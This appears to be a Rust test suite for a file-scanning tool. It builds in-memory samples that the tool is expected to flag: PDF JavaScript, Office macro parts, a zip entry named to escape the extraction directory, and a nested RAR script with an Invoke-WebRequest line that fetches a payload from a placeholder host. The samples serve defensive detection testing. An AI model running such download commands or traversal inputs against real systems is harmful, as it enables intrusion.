    #[test]
    fn pdf_javascript_is_high_severity() {
        let analysis = analyze_bytes(
            Path::new("invoice.pdf"),
            b"%PDF-1.7\n/JavaScript 1 0 R\n%%EOF",
            &limits(),
        );
        assert!(
            analysis
                .facts
                .iter()
                .any(|fact| fact.category == "pdf_active_content")
        );
    }

    #[test]
    fn pdf_marker_text_inside_a_stream_is_not_active_content() {
        let document = b"%PDF-1.7\n1 0 obj\n<< /Length 21 >>\nstream\nrandom data /JS noise\nendstream\nendobj\n%%EOF";
        let analysis = analyze_bytes(Path::new("paper.pdf"), document, &limits());
        assert!(
            !analysis
                .facts
                .iter()
                .any(|fact| fact.category == "pdf_active_content")
        );
    }

    #[test]
    fn ordinary_ooxml_parts_do_not_trigger_script_or_polyglot_findings() {
        let mut bytes = Cursor::new(Vec::new());
        {
            let mut zip = zip::ZipWriter::new(&mut bytes);
            let options = zip::write::SimpleFileOptions::default();
            zip.start_file("[Content_Types].xml", options).unwrap();
            std::io::Write::write_all(
                &mut zip,
                br#"<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/></Types>"#,
            )
            .unwrap();
            zip.start_file("ppt/slides/slide1.xml", options).unwrap();
            std::io::Write::write_all(
                &mut zip,
                br#"<p:sld xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"><a:t>clientSocket.connect((serverName, serverPort))</a:t><a:t>Transport layer listener</a:t></p:sld>"#,
            )
            .unwrap();
            zip.start_file("ppt/slides/_rels/slide1.xml.rels", options)
                .unwrap();
            std::io::Write::write_all(
                &mut zip,
                br#"<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>"#,
            )
            .unwrap();
            zip.finish().unwrap();
        }

        let analysis = analyze_bytes(Path::new("lecture.pptx"), bytes.get_ref(), &limits());
        assert!(!analysis.facts.iter().any(|fact| {
            fact.severity >= Severity::High
                || fact.category == "polyglot"
                || fact.category == "extension_mismatch"
        }));
    }

    #[test]
    fn ooxml_macro_parts_remain_high_severity() {
        let mut bytes = Cursor::new(Vec::new());
        {
            let mut zip = zip::ZipWriter::new(&mut bytes);
            let options = zip::write::SimpleFileOptions::default();
            zip.start_file("word/vbaProject.bin", options).unwrap();
            std::io::Write::write_all(&mut zip, b"macro project").unwrap();
            zip.finish().unwrap();
        }

        let analysis = analyze_bytes(Path::new("macro-enabled.docx"), bytes.get_ref(), &limits());
        assert!(
            analysis
                .facts
                .iter()
                .any(|fact| fact.category == "ooxml_macro" && fact.severity == Severity::High)
        );
    }

    #[test]
    fn zip_entries_are_analysed_without_disk_writes() {
        let mut bytes = Cursor::new(Vec::new());
        {
            let mut zip = zip::ZipWriter::new(&mut bytes);
            let options = zip::write::SimpleFileOptions::default();
            zip.start_file("../escape.exe", options).unwrap();
            std::io::Write::write_all(&mut zip, b"MZ").unwrap();
            zip.finish().unwrap();
        }
        let analysis = analyze_bytes(Path::new("sample.zip"), bytes.get_ref(), &limits());
        assert!(
            analysis
                .facts
                .iter()
                .any(|fact| fact.category == "archive_path_traversal")
        );
    }

    #[test]
    fn rar_inside_zip_is_analysed_recursively_in_memory() {
        let mut rar = rar_codec::ArchiveBuilder::new();
        rar.add_stored(
            "payload.ps1",
            b"Invoke-WebRequest https://example.invalid/payload.exe",
        )
        .unwrap();
        let rar = rar.finish();

        let mut bytes = Cursor::new(Vec::new());
        {
            let mut zip = zip::ZipWriter::new(&mut bytes);
            zip.start_file("inner.rar", zip::write::SimpleFileOptions::default())
                .unwrap();
            std::io::Write::write_all(&mut zip, &rar).unwrap();
            zip.finish().unwrap();
        }

        let analysis = analyze_bytes(Path::new("outer.zip"), bytes.get_ref(), &limits());
        assert!(
            analysis
                .components
                .iter()
                .any(|component| component.nesting_path == "inner.rar/payload.ps1")
        );
        assert!(
            analysis
                .facts
                .iter()
                .any(|fact| fact.category == "network_endpoint")
        );
        assert!(!analysis.boundaries.iter().any(|boundary| {
            boundary
                .detail
                .contains("RAR extraction is not implemented")
        }));
    }

    #[test]
    fn pdf_with_embedded_zip_reports_components() {
        let mut zip_bytes = Cursor::new(Vec::new());
        {
            let mut zip = zip::ZipWriter::new(&mut zip_bytes);
            zip.start_file("payload.txt", zip::write::SimpleFileOptions::default())
                .unwrap();
            std::io::Write::write_all(&mut zip, b"hello").unwrap();
            zip.finish().unwrap();
        }
        let mut document = b"%PDF-1.7\n".to_vec();
        document.extend_from_slice(zip_bytes.get_ref());
        document.extend_from_slice(b"\n%%EOF");
        let analysis = analyze_bytes(Path::new("report.pdf"), &document, &limits());
        assert!(
            analysis
                .components
                .iter()
                .any(|component| component.nesting_path.contains("embedded.zip"))
        );
    }
